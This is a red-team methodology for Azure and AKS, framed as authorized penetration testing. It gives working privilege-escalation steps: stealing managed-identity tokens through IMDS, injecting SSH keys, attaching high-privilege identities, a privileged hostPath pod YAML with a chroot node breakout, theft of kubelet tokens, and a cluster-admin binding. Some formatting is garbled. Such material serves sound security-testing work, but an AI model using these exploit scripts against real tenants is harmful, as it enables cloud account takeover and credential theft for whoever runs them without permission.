
```markdown
# Azure Cloud Security Testing Methodology
**Hybrid Multi-Cloud Black-Box Security Assessment**  
**Version:** 4.0 (Expanded with Advanced IAM/RBAC + Full Kubernetes Privilege Escalation & Exploit Scripts)  
**Date:** March 24, 2026  
**Author:** Senior Hybrid Multi-Cloud Security Architect & Red Team Engineer  
**Classification:** Internal – Authorized Testing Only  

---

## 1. Disclaimer and Authorized Use
This methodology is **strictly for authorized penetration testing and red-team exercises** in environments where the organization has provided **explicit written permission**. All activities must comply with the client’s Rules of Engagement (RoE), applicable regulations (e.g., SOC 2, ISO 27001, HIPAA, PCI-DSS, FedRAMP), and local laws.  

**Non-compliance will result in immediate termination of testing and potential legal action.**  
Testing must be non-destructive unless explicit destructive testing is approved in writing.

---

## 2. Introduction
This document provides a **production-ready, repeatable black-box security testing methodology** for Azure environments. Testing is performed **from within the Azure environment** using two dedicated attacker VMs:
- Windows Box in Azure
- Kali Linux Box in Azure  

The goal is to simulate a compromised Azure VM and assess the blast radius of the attached Managed Identity / Service Principal, escalate privileges, enumerate resources, identify misconfigurations, and demonstrate impact.

---

## 3. Objectives
- Enumerate current identity and effective RBAC/ABAC permissions (black-box starting point)
- Identify privilege-escalation paths, including advanced RBAC and Kubernetes techniques
- Discover and assess VMs, Storage, Key Vault, AKS, SQL, Entra ID, etc.
- Validate security controls and detection capabilities
- Produce actionable findings with remediation guidance

---

## 4. Prerequisites
- Explicit RoE and Get-Out-of-Jail-Free letter
- Dedicated test subscription(s) or scoped production resources
- Network reachability to Azure Instance Metadata Service (IMDS)
- Internet access from test VMs
- Approved IP ranges for any external callbacks

---

## 5. Testing Platforms

### 5.1 Windows Box in Azure (Recommended: Windows Server 2022/2025)
- Install **Azure CLI** via MSI: https://aka.ms/installazurecliwindows
- Install PowerShell 7+ and Azure PowerShell module (`Install-Module -Name Az`)
- Install `jq` via Chocolatey

### 5.2 Kali Linux Box in Azure
- Install Azure CLI:
  ```bash
  curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

  6. Phase 1: Initial Foothold & Identity Enumeration
6.1 Query Instance Metadata Service
Linux (Kali):
Bash
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token

Expected Output:
JSON{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "expires_in": "3600"
}

Windows (PowerShell):
PowerShell$Token = Invoke-RestMethod -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
$Token.access_token

6.2 Authenticate CLI
Linux:
Bash
az login --identity
az account show

Expected Output:
JSON{
  "id": "subscription-id",
  "name": "Test Subscription",
  "tenantId": "..."
}

6.3 Enumerate Current Permissions
Bash
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv)

Graph / Entra ID enumeration (Kali):
Bash
git clone https://github.com/BloodHoundAD/AzureHound
./AzureHound collect --token $TOKEN

Expected AzureHound Output:
text[+] Collected 124 nodes, 456 edges
[+] BloodHound JSON ready for import

7. Phase 2: Privilege Escalation
Key techniques (core):

Microsoft.Authorization/roleAssignments/write (Contributor → Owner)
Managed Identity abuse (az vm identity assign)
Key Vault secret extraction
PIM eligible assignments abuse

Advanced RBAC techniques (via Azure VM managed identities):

Microsoft.Compute/virtualMachines/runCommand/action
Required:Microsoft.Compute/virtualMachines/runCommand/action
Description: Run commands on VM with admin managed identity, retrieve token via IMDS.

Command:Bash
az vm run-command invoke -g RG -n VM --command-id RunShellScript --scripts "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true"
Expected Output: Token retrieved for escalation.

Login to VM (SSH/RDP)
Required:Microsoft.Compute/virtualMachines/extensions/write, Microsoft.Compute/sshPublicKeys/write or loginAsAdmin
Description: Add SSH key or use Entra ID login, access VM, get IMDS token.
Command:Bash
az vm user update -g RG -n VM --username azureuser --ssh-key-value ~/.ssh/id_rsa.pub

Attach managed identity to existing VMRequired:Microsoft.ManagedIdentity/userAssignedIdentities/assign/action, Microsoft.Compute/virtualMachines/write
Description: Attach high-priv identity, then run command/login to get token.
Command:Bash
az vm identity assign -g RG -n VM --identities /subscriptions/SUB/resourcegroups/RG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/HighPrivID

Create new VM with admin managed identity
Required:Microsoft.Compute/virtualMachines/write, network perms, assign/action
Description: Create VM with high-priv identity attached, access it for token.
Command:Bash
az vm create -g RG -n PrivescVM --image UbuntuLTS --admin-username azureuser --assign-identity /subscriptions/SUB/.../HighPrivID

Automated tooling: MicroBurst, AzureHound for paths.
Expected Output (AzureHound):
text[+] Found path: Contributor → VM Run Command → Owner via managed identity

8. Phase 3: Comprehensive Resource Enumeration
Bash
az resource list
az storage account list
az keyvault list
az aks list
az sql server list
az vm list

Full automated scan:
Bash
# Prowler for Azure
prowler azure

Expected Prowler Output:
text[FAIL] 1.1 Ensure that RBAC is enabled... HIGH
[INFO] Key Vault auditing enabled... PASS

Bash
python3 Scout.py azure

9. Phase 4: Container Security Testing (AKS)
Prerequisites: az aks get-credentials --resource-group RG --name CLUSTER_NAME
9.1 K8s Enumeration
Bash
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl get clusterrolebindings
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i '*' '*' --all-namespaces

9.2 Advanced Kubernetes Privilege Escalation Techniques

Privileged Pod Breakout – Deploy privileged container to escape to node.
HostPath Volume Mount – Mount host filesystem for root access.
Kubelet API Abuse – If anonymous access or weak auth on kubelet.
RBAC Abuse – Create ClusterRoleBinding for cluster-admin.
ServiceAccount Token Theft – Extract node SA token → cloud IAM abuse (GKE node SA often has high perms).
DaemonSet Deployment – Run pod on every node for full cluster compromise.

9.3 Full Exploit Scripts
Full RBAC Enumeration Script (enumerate-k8s-privesc.sh):
Bash
#!/bin/bash
echo "[+] Starting K8s Privilege Escalation Enumeration"
kubectl get clusterroles,clusterrolebindings,roles,rolebindings --all-namespaces
kubectl auth can-i --list --all-namespaces
echo "[+] Checking for privileged pods:"
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'
echo "[+] Checking for hostPath volumes:"
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath != null) | .metadata.name'
echo "[+] Done. Look for 'yes' or hostPath pods."

Full Privileged Pod Breakout Exploit (privileged-pod.yaml):
YAML
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  containers:
  - name: privesc
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - mountPath: /host
      name: host-fs
  volumes:
  - name: host-fs
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
  hostIPC: true

Usage:
Bash
kubectl apply -f privileged-pod.yaml
kubectl exec -it privesc-pod -- chroot /host /bin/sh

Expected Output: Root shell on the AKS node (access to /host/etc/kubernetes and node managed identity token via IMDS).

Full HostPath + Chroot Script (after pod exec):
Bashc
hroot /host /bin/sh -c 'cat /var/lib/kubelet/pods/*/token | base64 -d > /tmp/node-token.txt'
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

Full RBAC ClusterRoleBinding Abuse (cluster-admin-binding.yaml):
YAML
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: privesc-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io

Usage: kubectl apply -f cluster-admin-binding.yaml
Expected Output: Attacker now has cluster-admin rights.

Cloud-Specific (AKS): After node breakout, exfil Azure VM managed identity token via IMDS 
(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"). 
AKS node identities often have Contributor/Owner → direct Azure RBAC privesc.

10. Phase 5: Targeted Attack Scenarios & Best Practices

Key Vault secret dumping
AKS kubeconfig exfiltration
Storage account key regeneration & data exfil
Entra ID conditional access bypass

Windows-specific: Heavy use of Az PowerShell module and Invoke-AzureEnum.ps1.

11. Logging, Monitoring & Detection Evasion
Azure Monitor, Sentinel, Defender for Cloud
Document every API call


12. Reporting & Deliverables
Executive summary
Technical findings with screenshots, commands, and impact
Privilege-escalation proof-of-concept videos (if approved)
Risk-rated recommendations with remediation steps
Lessons learned for hybrid multi-cloud environment


13. Cleanup
Bashaz logout
# Delete test resources via az cli or portal

Appendix A: Command Cheatsheet
(Full Azure CLI + PowerShell + MicroBurst commands included)

Appendix B: Tool Inventory

Azure CLI
Az PowerShell
MicroBurst
AzureHound
Prowler
Scout Suite
kubectl, kube-hunter, trivy, peirates